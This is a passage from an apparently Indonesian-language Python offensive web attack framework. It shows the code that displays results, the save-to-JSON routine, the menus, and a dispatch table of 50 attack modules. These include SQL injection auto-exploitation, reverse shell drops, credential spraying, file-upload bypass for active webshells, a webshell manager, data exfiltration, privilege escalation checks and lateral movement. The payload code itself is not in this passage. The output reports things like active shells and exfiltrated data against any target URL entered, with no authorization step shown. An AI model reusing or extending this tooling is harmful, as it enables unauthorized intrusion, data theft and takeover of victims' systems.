                box_line(f"    → {v['snippet'][:50]}", C["y"])
                VULN_FOUND.append(f"LFI → ?{v['param']}={v['payload'][:30]}")

        elif method == "Open Redirect Scan":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:30]}", C["r"])
                box_line(f"    → {v['location']}", C["y"])
                VULN_FOUND.append(f"Open Redirect → ?{v['param']}")

        elif method == "SSRF Probe":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['ssrf_target'][:40]}", C["r"])
                box_line(f"    ({v['status']}) {v['snippet'][:50]}", C["y"])
                VULN_FOUND.append(f"SSRF → ?{v['param']}={v['ssrf_target'][:30]}")

        elif method == "File Upload Bypass":
            for u in data.get("uploaded",[])[:4]:
                box_line(f"    [{u['status']}] {u['name']} @ {u['endpoint']}", C["r"])
                VULN_FOUND.append(f"Upload bypass → {u['name']}")
            for s in data.get("shells",[])[:3]:
                box_line(f"    SHELL ACTIVE → {s}?c=<cmd>", C["r"])
                VULN_FOUND.append(f"Active shell → {s}")

        elif method == "SSTI Probe":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:40]} → {v['expected']}", C["r"])
                VULN_FOUND.append(f"SSTI → ?{v['param']}")
            for v in data.get("rce",[])[:3]:
                box_line(f"    RCE via ?{v['param']}={v['payload'][:40]}", C["r"])
                VULN_FOUND.append(f"SSTI RCE → ?{v['param']}")

        elif method == "HTTP Request Smuggling":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    {v}", C["r"])
            VULN_FOUND.append(f"HTTP Smuggling → {len(data.get('vulnerable',[]))} payload")

        elif method == "CORS Misconfiguration":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    Origin: {v['origin']} → ACAO: {v['acao']} ACAC: {v['acac']}", C["r"])
                VULN_FOUND.append(f"CORS vuln → {v['acao']}")

        elif method == "Webshell Manager":
            box_line(f"    Shell  : {data.get('shell_url')}", C["r"])
            box_line(f"    Cmds   : {len(data.get('commands',[]))}", C["y"])
            VULN_FOUND.append(f"Webshell session → {data.get('shell_url')}")

        elif method == "JWT Attack":
            for atk in data.get("attacks",[])[:5]:
                box_line(f"    [{atk['type']}] {str(atk.get('token',''))[:60]}", C["r"])
                VULN_FOUND.append(f"JWT {atk['type']}")

        elif method == "GraphQL Introspection":
            for ep in data.get("endpoints",[])[:3]:
                box_line(f"    Endpoint: {ep}", C["r"])
                VULN_FOUND.append(f"GraphQL open → {ep}")
            if data.get("types"):
                box_line(f"    Types: {', '.join(data['types'][:6])}", C["y"])

        elif method == "Prototype Pollution":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    {v.get('payload','')[:50]}", C["r"])
            VULN_FOUND.append(f"Prototype Pollution → {len(data.get('vulnerable',[]))} hit")

        elif method == "Google Dork":
            for r in data.get("results",[])[:5]:
                box_line(f"    {r[:60]}", C["y"])
            VULN_FOUND.append(f"Google Dork → {len(data.get('results',[]))} result")

        elif method == "Wayback Scraper":
            box_line(f"    Total URLs  : {len(data.get('urls',[]))}", C["y"])
            box_line(f"    Interesting : {len(data.get('interesting',[]))}", C["r"])
            for u in data.get("interesting",[])[:5]:
                box_line(f"    → {u[:60]}", C["y"])
            VULN_FOUND.append(f"Wayback → {len(data.get('interesting',[]))} interesting URL")

        elif method == "JS File Analyzer":
            for f in data.get("findings",[])[:6]:
                box_line(f"    [{f['type']}] {f['value'][:55]}", C["r"])
                VULN_FOUND.append(f"JS secret [{f['type']}] → {f['value'][:40]}")

        elif method == "XML Injection":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    {v['payload'][:55]}", C["r"])
                VULN_FOUND.append(f"XML Injection → {v['payload'][:40]}")

        elif method == "CRLF Injection":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:40]}", C["r"])
                VULN_FOUND.append(f"CRLF → ?{v['param']}")

        elif method == "Host Header Injection":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    {v['endpoint']} | Host: {v['host']}", C["r"])
                VULN_FOUND.append(f"Host Header → {v['host']}")

        elif method == "CSS Injection":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:40]}", C["r"])
                VULN_FOUND.append(f"CSS Injection → ?{v['param']}")

        elif method == "WebSocket Hijacking":
            for ep in data.get("endpoints",[])[:3]:
                box_line(f"    WS Open → {ep}", C["r"])
                VULN_FOUND.append(f"WebSocket open → {ep}")
            for v in data.get("vulnerable",[])[:3]:
                box_line(f"    Response → {v['response'][:50]}", C["y"])

        elif method == "Email Harvester":
            for e in data.get("emails",[])[:8]:
                box_line(f"    {e}", C["y"])
            VULN_FOUND.append(f"Emails → {len(data.get('emails',[]))} ditemukan")

        elif method == "Parameter Discovery":
            for p in data.get("found",[])[:6]:
                box_line(f"    ?{p['param']}={p['val']} [{p['status']}] diff:{p['diff']}b", C["y"])
                VULN_FOUND.append(f"Hidden param → ?{p['param']}")

        elif method == "API Endpoint Brute":
            for ep in data.get("found",[])[:6]:
                box_line(f"    [{ep['status']}] {ep['endpoint']}", C["r"])
                VULN_FOUND.append(f"API endpoint → {ep['endpoint']}")

        elif method == "Tech CVE Auto-Match":
            for c in data.get("cves",[])[:6]:
                box_line(f"    [{c['keyword']}] {c['cve']} CVSS:{c['score']}", C["r"])
                box_line(f"    {c['desc'][:55]}", C["y"])
                VULN_FOUND.append(f"CVE {c['cve']} (CVSS:{c['score']})")

        elif method == "Metadata Extractor":
            for m in data.get("metadata",[])[:6]:
                box_line(f"    [{m['key']}] {m['value'][:50]}", C["y"])
                VULN_FOUND.append(f"Metadata → {m['key']}: {m['value'][:30]}")

        elif method == "Data Exfiltrator":
            for label, out in data.get("exfil",{}).items():
                box_line(f"    [{label}] {out[:55]}", C["r"])
                VULN_FOUND.append(f"Exfil [{label}]")
            if data.get("saved"):
                box_line(f"    Saved → {data['saved']}", C["y"])

        elif method == "PrivEsc Checker":
            for f in data.get("findings",[])[:6]:
                box_line(f"    [{f['check']}] {f['output'][:55]}", C["r"])
                VULN_FOUND.append(f"PrivEsc → {f['check']}")

        elif method == "Lateral Movement":
            for h in data.get("hosts",[])[:6]:
                box_line(f"    Host live → {h}", C["r"])
                VULN_FOUND.append(f"Internal host → {h}")
            for s in data.get("services",[])[:8]:
                box_line(f"    {s['host']}:{s['port']} OPEN", C["y"])

        elif method == "Subdomain Takeover":
            for v in data.get("vulnerable",[])[:5]:
                box_line(f"    {v['subdomain']} → {v['service']}", C["r"])
                box_line(f"    CNAME: {v['cname']}", C["y"])
                VULN_FOUND.append(f"Takeover → {v['subdomain']} ({v['service']})")

        elif method == "Cookie Manipulation":
            for f in data.get("findings",[])[:5]:
                box_line(f"    [{f['attack']}] {f['cookie']}", C["r"])
                if "secret" in f:
                    box_line(f"    Secret: {f['secret']}", C["y"])
                VULN_FOUND.append(f"Cookie {f['attack']} → {f['cookie']}")

    # ── TOTAL VULN ────────────────────────────
    print(C["r"] + C["B"] + "  ╠" + "═"*W + "╣")
    box_line(f"  TOTAL VULN DITEMUKAN: {len(VULN_FOUND)}", C["r"] + C["B"])
    print(C["r"] + C["B"] + "  ╠" + "─"*W + "╣")
    for i, v in enumerate(VULN_FOUND, 1):
        box_line(f"  {i:>2}. {v}", C["y"])
    print(C["r"] + C["B"] + "  ╚" + "═"*W + "╝")
    print()

# ══════════════════════════════════════════
#  SIMPAN HASIL
# ══════════════════════════════════════════

def save_results():
    ts     = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    domain = get_domain(TARGET_URL).replace(".", "_")
    fname  = f"mr414n_{domain}_{ts}.json"
    with open(fname, "w") as f:
        json.dump({"target": TARGET_URL, "timestamp": ts,
                   "results": RESULTS}, f, indent=2, default=str)
    print(C["g"] + C["B"] + f"\n  [✓] Hasil disimpan → {fname}\n")

# ══════════════════════════════════════════
#  POST-SCAN MENU
# ══════════════════════════════════════════

def post_scan_menu():
    print_summary()
    while True:
        print(C["g"] + C["B"] + "  ┌─[ NEXT STEP ]──────────────────────────────┐")
        print(C["g"] + "  │ " + C["y"] + "[1]" + C["w"] + " Lanjut scan metode lain")
        print(C["g"] + "  │ " + C["y"] + "[2]" + C["w"] + " Keluar tools")
        print(C["g"] + "  │ " + C["y"] + "[3]" + C["w"] + " Simpan hasil ke file .json")
        print(C["g"] + C["B"] + "  └────────────────────────────────────────────┘")
        print()
        ch = input(C["w"] + "  Pilih » ").strip()
        if ch == "1":
            return "continue"
        elif ch == "2":
            print(C["r"] + "\n  [*] Keluar. Stay sharp.\n")
            sys.exit(0)
        elif ch == "3":
            save_results()
        else:
            print(C["r"] + "  [!] Pilihan tidak valid.")

# ══════════════════════════════════════════
#  DISPATCH & MAIN
# ══════════════════════════════════════════

DISPATCH = {
    "1" : ("Header Inspector",        header_inspector),
    "2" : ("DNS Lookup",              dns_lookup),
    "3" : ("Port Scanner",            port_scanner),
    "4" : ("WHOIS Grab",              whois_grab),
    "5" : ("Dir Brute-Force",         dir_bruteforce),
    "6" : ("Tech Fingerprint",        tech_fingerprint),
    "7" : ("SQL Inject Probe",        sqli_probe),
    "8" : ("NoSQL Inject Probe",      nosql_probe),
    "9" : ("Command Inject Probe",    cmdi_probe),
    "10": ("XSS Probe",               xss_probe),
    "11": ("XXE Probe",               xxe_probe),
    "12": ("Broken Auth",             broken_auth),
    "13": ("Sensitive Data Scan",     sensitive_data_scan),
    "14": ("Broken Access Control",   broken_access_ctrl),
    "15": ("Security Misconfig",      security_misconfig),
    "16": ("Insecure Deserialization",insecure_deser),
    "17": ("Known Vuln Check",        known_vuln_check),
    "18": ("Subdomain Enum",          subdomain_enum),
    "19": ("SQLi Auto-Exploit",       sqli_autoexploit),
    "20": ("Reverse Shell Drop",      reverse_shell_drop),
    "21": ("Credential Spray",        credential_spray),
    "22": ("LFI Probe",               lfi_probe),
    "23": ("Open Redirect Scan",      open_redirect_scan),
    "24": ("SSRF Probe",              ssrf_probe),
    "25": ("File Upload Bypass",      file_upload_bypass),
    "26": ("SSTI Probe",              ssti_probe),
    "27": ("HTTP Request Smuggling",  http_smuggling),
    "28": ("CORS Misconfiguration",   cors_misconfig),
    "29": ("Webshell Manager",        webshell_manager),
    "30": ("JWT Attack",              jwt_attack),
    "31": ("GraphQL Introspection",   graphql_introspection),
    "32": ("Prototype Pollution",     prototype_pollution),
    "33": ("Google Dork",             google_dork),
    "34": ("Wayback Scraper",         wayback_scraper),
    "35": ("JS File Analyzer",        js_analyzer),
    "36": ("XML Injection",           xml_injection),
    "37": ("CRLF Injection",          crlf_injection),
    "38": ("Host Header Injection",   host_header_injection),
    "39": ("CSS Injection",           css_injection),
    "40": ("WebSocket Hijacking",     websocket_hijack),
    "41": ("Email Harvester",         email_harvester),
    "42": ("Parameter Discovery",     parameter_discovery),
    "43": ("API Endpoint Brute",      api_endpoint_brute),
    "44": ("Tech CVE Auto-Match",     tech_cve_match),
    "45": ("Metadata Extractor",      metadata_extractor),
    "46": ("Data Exfiltrator",        data_exfiltrator),
    "47": ("PrivEsc Checker",         privesc_checker),
    "48": ("Lateral Movement",        lateral_movement),
    "49": ("Subdomain Takeover",      subdomain_takeover),
    "50": ("Cookie Manipulation",     cookie_manipulation),
}

def main():
    while True:
        banner()
        menu()
        choice = input(C["w"] + "  Pilih » ").strip().upper()
        if choice == "0":
            print(C["r"] + "\n  [*] Keluar. Stay sharp.\n")
            sys.exit(0)
        elif choice == "A":
            url = get_target("Full OWASP Recon — semua metode")
            full_recon(url)
        elif choice in DISPATCH:
            name, fn = DISPATCH[choice]
            url = get_target(name)
            fn(url)
        else:
            print(C["r"] + "  [!] Pilihan tidak valid.")
            time.sleep(1)
            continue
        post_scan_menu()

if __name__ == "__main__":
    main()
